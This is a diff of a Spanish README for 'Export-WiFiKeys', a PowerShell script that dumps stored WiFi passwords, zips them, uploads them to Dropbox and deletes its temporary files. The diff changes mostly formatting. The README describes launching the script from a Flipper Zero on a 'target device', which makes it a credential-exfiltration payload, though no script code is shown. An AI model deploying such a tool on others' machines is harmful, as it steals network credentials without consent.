@@ -1,40 +1,46 @@
 ---
 
-# Export-WiFiKeys
+# **Export-WiFiKeys**
 
 Este script de PowerShell exporta las contraseñas de las redes WiFi almacenadas en tu computadora, las guarda en archivos de texto, las comprime en un archivo ZIP y luego sube el archivo ZIP a Dropbox. Después de completar el proceso, los archivos temporales se eliminan.
 
-## Requisitos
+
+---
+
+## **Requisitos**
 
 - PowerShell 5.0 o superior
 - Acceso a Internet
 - Una cuenta de Dropbox y un token de acceso a la API de Dropbox
 
-## Instalación
+## **Instalación**
 
 1. Clona este repositorio o descarga los archivos necesarios.
-
 2. Define tu token de acceso a Dropbox en el script antes de ejecutarlo:
 
     ```powershell
     $db = "tu_token_de_dropbox"
     ```
 
-## Uso
+## **Uso**
 
 ### En Windows:
 
 1. Abre PowerShell con permisos de administrador.
-
 2. Navega al directorio donde se encuentra el script.
-
 3. Ejecuta el script:
 
     ```powershell
     .\Export-WiFiKeys.ps1
     ```
 
-El script creará un directorio con la fecha y hora actual en tu carpeta de Documentos, almacenará las contraseñas WiFi en archivos de texto dentro de este directorio, comprimirá el directorio en un archivo ZIP y subirá el archivo ZIP a tu cuenta de Dropbox. Después de completar estos pasos, el script eliminará los archivos temporales creados durante el proceso.
+El script realizará las siguientes acciones:
+
+- Creará un directorio con la fecha y hora actual en tu carpeta de Documentos.
+- Almacenará las contraseñas WiFi en archivos de texto dentro de este directorio.
+- Comprimirá el directorio en un archivo ZIP.
+- Subirá el archivo ZIP a tu cuenta de Dropbox.
+- Eliminará los archivos temporales creados durante el proceso.
 
 ### En Flipper Zero:
 
@@ -55,9 +61,9 @@ Esto ejecutará el script de PowerShell en el dispositivo de destino, exportando
 
 ---
 
-## Detalles del Script
+## **Detalles del Script**
 
-### Export-WiFiKeys
+### **Export-WiFiKeys**
 
 Esta función realiza los siguientes pasos:
 
@@ -67,7 +73,7 @@ Esta función realiza los siguientes pasos:
 4. Llama a la función `DropBox-Upload` para subir el archivo ZIP a Dropbox.
 5. Elimina los archivos temporales creados durante el proceso.
 
-### DropBox-Upload
+### **DropBox-Upload**
 
 Esta función realiza los siguientes pasos:
 
@@ -75,13 +81,17 @@ Esta función realiza los siguientes pasos:
 2. Define los encabezados y parámetros necesarios para la solicitud a la API de Dropbox.
 3. Usa `Invoke-RestMethod` para subir el archivo a Dropbox.
 
-## Notas
+---
+
+## **Notas**
 
 - Asegúrate de tener suficiente espacio en tu cuenta de Dropbox para el archivo ZIP que se subirá.
 - El script debe ejecutarse con permisos de administrador para acceder a las contraseñas WiFi almacenadas en el sistema.
 - **Recuerda:** Este script también puede ser ejecutado desde un Flipper Zero, lo que lo hace útil para pruebas en entornos controlados.
 
-## Licencia
+---
+
+## **Licencia**
 
 Este proyecto está licenciado bajo los términos de la licencia MIT. Consulta el archivo `LICENSE` para más detalles.
 
